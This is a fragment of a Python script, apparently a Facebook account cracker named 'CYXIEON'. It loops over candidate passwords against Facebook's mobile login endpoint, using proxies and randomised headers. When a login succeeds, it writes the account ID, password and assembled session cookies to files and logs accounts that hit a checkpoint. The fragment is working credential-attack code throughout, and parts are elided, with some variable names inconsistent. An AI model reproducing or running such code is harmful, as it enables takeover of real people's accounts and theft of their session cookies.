...
def crackasyinc(idf,pwx):
  ...
  for pw in pwx:
    try:
      ...
      link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1698759910663%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11882eacffa74c%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff20ac86f797bf8%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dpopup%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df27d658274b4528%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c1b2dbb7790e4%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff20ac86f797bf8%2526relation%253Dopener%2526frame%253Df220545b8b612ac%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c1b2dbb7790e4%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff20ac86f797bf8%26relation%3Dopener%26frame%3Df220545b8b612ac%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      data = {
    ...
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=OQVJZIGesLEuK2UlcNwiVmD8; sb=jOlLZLXMDKu8lzy2Gh9z7qMF; m_pixel_ratio=1; wd=1348x955; fr=0iMrWos7qWFcuoxzM.AWV_-ZZ4BEmyTwwgue8kIKXNTi0.BlDAV5.Nl.AAA.0.0.BlQNpY.AWW03sXSGVs',
    'dpr': f'{str(rr(1,5))}',
    'origin': 'https://m.facebook.com',
    ...
    'x-response-format': 'JSONStream',
      ...
      ses.post('https://m.facebook.com/login/device-based/login/async/',headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = po.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print("{hijo}{idf}|{pw}{puti}\n{hijo}{kuki}{puti}")
        prints(tree)
        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print("{kun}{idf}|{pw}{puti}")
        prints(tree)
        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
